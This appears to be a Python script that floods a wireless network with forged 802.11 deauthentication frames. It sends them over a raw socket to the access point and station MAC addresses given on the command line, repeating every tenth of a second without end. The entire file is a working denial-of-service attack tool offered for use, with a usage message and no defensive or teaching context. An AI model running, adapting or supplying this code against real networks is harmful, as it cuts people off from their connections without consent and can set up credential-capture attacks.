import socket
import struct
import binascii
import logging
import time
import sys
import os

logging.basicConfig(
    format="[%(levelname)s] [%(asctime)s] %(message)s",
    level=logging.INFO
)

logger = logging.getLogger(__name__)
home = "/home/magregory"

if not os.path.exists(f"{home}/inter"):
    logger.error("Interface file does not exists!")
    sys.exit(-1)

with open(f"{home}/inter", "r") as f:
    interface = f.read().strip()

sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
sock.bind((interface, socket.htons(0x0003)))

def create_packet(ap_mac: str, sta_mac: str) -> bytes:
    packet = struct.pack("!1xH5x", 0x8) # Radio tap
    packet += struct.pack("!H2x", 0xC000) # packet type
    packet += binascii.unhexlify(sta_mac.replace(":", ""))
    packet += binascii.unhexlify(ap_mac.replace(":", ""))
    packet += binascii.unhexlify(ap_mac.replace(":", ""))
    packet += struct.pack("=2xH", 0x0007) # Reason 7 for deauthentication
    return packet

def deauth_loop(ap_mac: str, sta_mac: str) -> None:
    packet = create_packet(ap_mac, sta_mac)

    while True:
        try:
            logger.info(f"Deauth AP '{ap_mac}' STA '{sta_mac}'")
            time.sleep(0.1)
            sock.send(packet)
        except Exception as ex:
            print(ex)
            logger.error("[-] Error!")
            pass
        except KeyboardInterrupt:
            logger.error("Quitting! ...")
            sys.exit(-1)
            break

def main() -> None:
    if len(sys.argv) != 3:
        print(f"[*] Usage: {sys.argv[0]} [AP_MAC] [STA_MAC]")
        sys.exit(-1)

    while True:
        try:
            ap_mac = str(sys.argv[1])
            sta_mac = str(sys.argv[2])
            deauth_loop(ap_mac, sta_mac)
        except KeyboardInterrupt:
            sys.exit(-1)
            break

if __name__ == '__main__':
    main()
